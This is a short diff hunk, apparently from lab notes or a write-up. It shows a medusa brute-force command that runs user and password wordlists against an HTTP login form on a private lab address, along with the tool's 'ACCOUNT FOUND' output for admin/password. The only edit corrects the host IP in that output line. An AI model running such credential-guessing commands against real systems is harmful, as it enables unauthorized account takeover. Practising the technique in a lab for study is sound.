@@ -31,7 +31,7 @@ medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http
 -m FORM: ’username=^USER^&password=^PASS^&Login=Login’
 -m ‘FAIL=Login failed’ -t 6
 
-2025-10-26 13:41::02 ACCOUNT FOUND [http] Host: 192.168.56.101 User: admin Password: password [SUCESS] 
+2025-10-26 13:41::02 ACCOUNT FOUND [http] Host: 192.168.56.102 User: admin Password: password [SUCESS] 
 
 3#
 
